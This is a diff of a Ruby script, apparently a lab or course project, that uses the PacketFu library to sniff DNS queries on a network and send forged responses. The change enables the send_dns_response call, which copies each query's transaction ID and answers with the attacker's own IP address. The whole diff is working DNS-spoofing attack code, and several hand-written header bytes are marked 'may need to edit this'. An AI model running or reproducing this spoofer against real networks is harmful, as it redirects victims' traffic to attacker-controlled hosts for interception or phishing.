@@ -47,19 +47,16 @@ def spoof_dns(t_ip)
   cap.stream.each do |p|
     pkt = PacketFu::Packet.parse(p)
     if pkt.is_udp?
-      #dns_hdr_flag = pkt.payload[2].to_s + pkt.payload[3].to_s
-      #puts dns_hdr_flag.unpack('h*')
       dns_hdr_flag = pkt.payload[2].unpack('h*')[0].chr+pkt.payload[3].unpack('h*')[0].chr
 
       #check if query
       if dns_hdr_flag == '10'
-        puts pkt.payload
         domain_name = extract_domain(pkt.payload[13..-1])
 
         puts "Domain name is: #{domain_name}"
 
         #build and send response
-        #send_dns_response(pkt, domain_name)
+        send_dns_response(pkt, domain_name)
       end
     end
   end
@@ -101,28 +98,32 @@ def send_dns_response(orig_pkt, name)
 
   #DNS header
   #copy transaction ID from original query to response
-=begin
   transID1 = orig_pkt.payload[0].unpack('H*')[0]
   transID2 = orig_pkt.payload[1].unpack('H*')[0]
   transID = transID1.hex.chr + transID2.hex.chr
-  dns_resp.payload = transID
-=end
-  dns_resp.payload = orig_pkt.payload[0,2]
-  dns_resp.payload += "\x85\x80" + "\x00\x01\x00\x02" + "\x04\x00\x00\x04" #may need to edit this
+  tmp_payload = transID
+
+  #tmp_payload = orig_pkt.payload[0,2].unpack
+  tmp_payload += "\x85\x80".force_encoding('ASCII-8BIT') + "\x00\x01\x00\x02".force_encoding('ASCII-8BIT') 
+  tmp_payload += "\x04\x00\x00\x04".force_encoding('ASCII-8BIT') #may need to edit this
 
   #Domain Name
   name.split('.').each do |part|
-    dns_resp.payload += part.length.chr
-    dns_resp.payload += part
+    tmp_payload += part.length.chr
+    tmp_payload += part
   end
 
   #Rest of DNS Header (defaults from notes)
-  dns_resp.payload += "\x00\x00\x01"+"\x00\x01"+"\xc0\x0c\x00\x05"+"\x00\x01\x00\x02\xa3\x00\x04" #may need to edit this
+  tmp_payload += "\x00\x00\x01".force_encoding('ASCII-8BIT') + "\x00\x01".force_encoding('ASCII-8BIT') 
+  tmp_payload += "\xc0\x0c\x00\x05".force_encoding('ASCII-8BIT')
+  tmp_payload += "\x00\x01\x00\x02\xa3\x00\x04".force_encoding('ASCII-8BIT') #may need to edit this
 
 
   #Spoofed IP
   ip_ary = @sender_ip.split('.')
-  dns_resp.payload += [ip_ary[0].to_i, ip_ary[1].to_i, ip_ary[2].to_i, ip_ary[3].to_i].pack('c*')
+  tmp_payload += [ip_ary[0].to_i, ip_ary[1].to_i, ip_ary[2].to_i, ip_ary[3].to_i].pack('c*')
+
+  dns_resp.payload = tmp_payload
 
   #Bundle and send
   dns_resp.recalc
